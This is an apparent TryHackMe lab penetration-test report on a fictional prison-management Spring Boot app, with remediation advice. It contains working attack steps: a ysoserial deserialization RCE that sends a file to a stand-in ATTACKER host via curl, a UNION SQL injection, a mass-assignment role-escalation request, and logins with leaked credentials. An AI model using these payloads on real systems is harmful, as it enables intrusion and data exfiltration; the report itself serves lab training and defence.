Ironhold — Penetration Test Disclosure Report

TryHackMe Hard · 2026-07-18

Target: 10.67.135.77 Assessment Date: 2026-07-18 Mode: pt1 Classification: CONFIDENTIAL Application: Ironhold Correctional facility management (Spring Boot 2.7.18 / Java 11) Web: http://10.67.135.77:8080

1. Executive Summary

Ironhold’s inmate-management platform was assessed using the publicly leaked unredacted source repository and the live lab instance. Seven confirmed issues were identified, including two Critical findings (privilege escalation via mass assignment and remote code execution via insecure Java deserialization). With no prior credentials, an attacker can authenticate using seeded officer passwords from source, read restricted Internal Affairs data via SQL injection, elevate to Warden through an unrestricted profile field, and achieve OS command execution as appuser on the facility host—reading the host-level flag under /opt/ironhold/. Maximum access achieved: authenticated application compromise (Warden role) plus remote code execution on the application container/host as the service account.

5. Detailed Findings

F-04: Insecure Java deserialization on bulk import (RCE)

Severity: Critical (CVSSv3: 9.9) Affected Component: POST /admin/import (ImportExportController); dependency commons-collections 3.2.x

Description: The bulk import endpoint accepts a Base64 body, decodes it, and immediately deserializes the bytes with ObjectInputStream.readObject() without type filtering or allowlisting. The project intentionally (or carelessly) includes a vulnerable Commons Collections 3.x range suitable for gadget chains. Combined with Warden access (or F-03), this yields remote code execution as the application user.

Steps to Reproduce:

# After obtaining a Warden session (see F-03):
# Generate CommonsCollections7 gadget (Java 11: use --add-opens if needed for other gadgets)
CMD='curl -G http://ATTACKER:8000/cat --data-urlencode d@/opt/ironhold/flag.txt'
B64=$(printf '%s' "$CMD" | base64 -w0)
java -jar ysoserial.jar CommonsCollections7 "bash -c {echo,${B64}}|{base64,-d}|bash" \
  | base64 -w0 > /tmp/payload.b64
curl -b cookies.txt -X POST http://10.67.135.77:8080/admin/import \
  -H 'Content-Type: text/plain' --data-binary @/tmp/payload.b64
# Observe callback with file contents (HTTP 500 on import is expected)

Impact: Full command execution on the facility host as appuser; read of host secrets including /opt/ironhold/flag.txt; potential pivot to further host compromise.

CVSS Justification: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H — network RCE with low complexity once low-privilege app user is obtained; scope changed (host beyond pure app data).

Evidence: screenshots/F-04_deser_rce.txt, screenshots/F-04_http_exfil_log.txt, screenshots/flag_4.txt, exploits/deser_import.sh

F-03: Mass assignment — arbitrary role elevation to WARDEN

Severity: Critical (CVSSv3: 8.8) Affected Component: POST /profile/update (ProfileController)

Description: Profile updates bind a Staff model attribute and apply role from the client if non-blank. The HTML form does not expose a role control, but the server honors a forged parameter. WardenInterceptor only checks staff.isWarden() against the database role, so elevation grants the entire /admin/** surface including door control and import.

Steps to Reproduce:

curl -c c.txt -b c.txt -X POST http://10.67.135.77:8080/login \
  -d 'username=j.reyes&password=IronholdStaff2026!'
curl -b c.txt -X POST http://10.67.135.77:8080/profile/update \
  -d 'fullName=Officer+J.+Reyes&email=j.reyes@ironhold.example&badgeNumber=O-104&role=WARDEN'
curl -b c.txt http://10.67.135.77:8080/admin/control
# Displays Facility Master Override Code / Flag 3

Impact: Vertical privilege escalation from officer to warden; access to door-control panel, staff administration, diagnostics, and RCE-prone import.

CVSS Justification: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H — authenticated low-privilege user, high CIA impact on application.

Evidence: screenshots/flag3_warden_door_control.html, screenshots/flag_3.txt

F-01: Seeded / hardcoded staff credentials in leaked source

Severity: High (CVSSv3: 8.6) Affected Component: DataSeeder.java; POST /login

Description: The leaked repository hardcodes the password used for all non-kiosk, non-warden staff: IronholdStaff2026!. Usernames j.reyes, m.chen, a.osei, and l.bianchi authenticate successfully. The officer dashboard renders facility notices containing Flag 1.

Steps to Reproduce:

curl -c c.txt -b c.txt -X POST http://10.67.135.77:8080/login \
  -d 'username=j.reyes&password=IronholdStaff2026!'
curl -b c.txt http://10.67.135.77:8080/dashboard | grep -oE 'THM\{[^}]+\}'
# THM{k10sk_c0nsol3_unl0ck3d}

Impact: Immediate authenticated access for any party holding the repository; bypasses need for credential guessing.

CVSS Justification: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L — public knowledge of password from source leak; high confidentiality impact on app data.

Evidence: loot/creds.txt, screenshots/flag1_officer_dashboard.html, screenshots/flag_1.txt

F-02: SQL injection in inmate search (UNION → case_files)

Severity: High (CVSSv3: 7.5) Affected Component: GET /inmates/search?q= (InmateController)

Description: The search builds SQL via string concatenation: SELECT id, name, block FROM inmates WHERE name = '" + q + "'". A reduced-privilege H2 user (ironhold_lookup) can SELECT only inmates and case_files. UNION against case_files returns Internal Affairs case summary text (Flag 2) that no template intentionally displays.

Steps to Reproduce:

# authenticated session required
curl -b c.txt -G 'http://10.67.135.77:8080/inmates/search' \
  --data-urlencode "q=x' UNION SELECT id, summary, status FROM case_files--"
# Row shows THM{c4s3_f1l3_pull3d_via_uni0n}

Impact: Disclosure of sensitive case-file content and any other data readable by the lookup principal.

CVSS Justification: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N — authenticated SQLi with high confidentiality impact; write not demonstrated under least-privilege account.

Evidence: screenshots/F-02_sqli_case_files.html, screenshots/flag_2.txt

F-05: Unauthenticated Spring Boot Actuator exposure

Severity: High (CVSSv3: 7.5) Affected Component: /actuator/** (excluded from auth interceptor); management.endpoints.web.exposure.include=*

Description: Actuator discovery, health, env, configprops, mappings, and related endpoints are reachable without authentication. Querying /actuator/env/app.kiosk.pw returned the kiosk password in cleartext (Sh1ftK10sk#2091).

Steps to Reproduce:

curl -s http://10.67.135.77:8080/actuator | head
curl -s http://10.67.135.77:8080/actuator/env/app.kiosk.pw
# value: Sh1ftK10sk#2091

Impact: Credential and configuration disclosure without any login; accelerates initial access and mapping of the app.

CVSS Justification: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — unauthenticated high confidentiality disclosure.

Evidence: screenshots/F-05_actuator_kiosk_pw.json

F-06: Authorization model trusts mutable database role

Severity: Medium (CVSSv3: 6.5) Affected Component: WardenInterceptor + SessionUtil (username-only session)

Description: Sessions store only the username. Privileged path checks re-load Staff.role from the database. There is no server-side separation preventing self-service mutation of that field (see F-03), and no CSRF protection on profile or import POSTs.

Steps to Reproduce: See F-03; observe role change on /profile after forged POST.

Impact: Weak foundation for access control; any mass-assignment or SQLi write would also elevate privileges.

CVSS Justification: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N — design weakness enabling high confidentiality impact when combined with F-03.

Evidence: source/src/main/java/com/ironhold/controller/ProfileController.java, security/WardenInterceptor.java

F-07: Shared officer and kiosk credentials

Severity: Medium (CVSSv3: 5.3) Affected Component: Seed data; operational notices

Description: All floor officers share one password; the kiosk is a shared shift account documented in facility notices. This violates least privilege and credential uniqueness.

Steps to Reproduce: Authenticate multiple officer accounts with IronholdStaff2026! (see F-01).

Impact: Single compromise or leak unlocks many identities; weak non-repudiation.

CVSS Justification: AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N — contributes to confidentiality exposure of operational accounts.

Evidence: loot/creds.txt, source/.../DataSeeder.java

6. Remediation (mapped to F-IDs)

ID Recommendation
F-04 Remove Java serialization from network boundaries. Prefer JSON schemas. If migration is required short-term, use a strict allowlist ObjectInputFilter and eliminate Commons Collections 3.x gadgets.
F-03 Never bind role (or other privilege fields) from client input. Use a dedicated DTO with only fullName/email/badge. Enforce role changes only via privileged admin API with audit logging.
F-01 Rotate all credentials after any source leak. Do not ship production passwords in seed code; use secrets managers and unique per-user passwords.
F-02 Use parameterized queries (? placeholders / JPA criteria). Keep least-privilege DB users; ensure sensitive tables are not granted even for “read-only lookup.”
F-05 Authenticate and network-restrict actuator. Set management.endpoints.web.exposure.include=health (or empty). Never expose env publicly. Remove /actuator/** from auth exclusions except health if required.
F-06 Store role claims in signed session tokens at login, or re-validate immutably; add CSRF tokens on state-changing forms.
F-07 Unique passwords per staff; disable shared kiosk or use short-lived device auth.

9. Limitations / Assumptions

  • Source was treated as accurate for the live build; confirmed by exploitation.
  • H2 in-memory database implies seed data and mutations are process-lifetime only.
  • Root/host privilege escalation beyond appuser was not pursued after flag capture; container boundaries may limit further access.
  • Warden env password was not cracked; F-03 made it unnecessary.
  • Assessment used rate-limited authentication and did not spray accounts.
